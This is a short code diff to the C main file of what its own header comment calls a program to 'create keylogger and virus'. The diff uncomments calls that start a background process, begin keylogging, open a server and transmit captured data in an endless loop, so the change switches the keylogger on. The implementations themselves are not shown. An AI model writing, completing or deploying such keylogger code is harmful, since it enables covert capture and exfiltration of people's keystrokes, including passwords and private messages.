@@ -3,10 +3,6 @@ Main function to run to create keylogger and virus
 */
 
 #include "keylogger.h"
-
-void background_process(void) {
-  // IMPLEMENTATION HERE
-}
 #include "client.h"
 #include <unistd.h>
 #include <sys/types.h>
@@ -17,13 +13,13 @@ void background_process(void) {
 }
 
 void main(void) {
-  // background_process();
-  // begin_keylogger();
-  // open_server();
+  background_process();
+  begin_keylogger();
+  open_server();
 
   pid_t my_pid = getpid();
-  // while (1) {
-  //   transmit_data();
+  while (1) {
+    transmit_data();
     //printf("%d\n",(int)my_pid);
     sleep(1);
   }
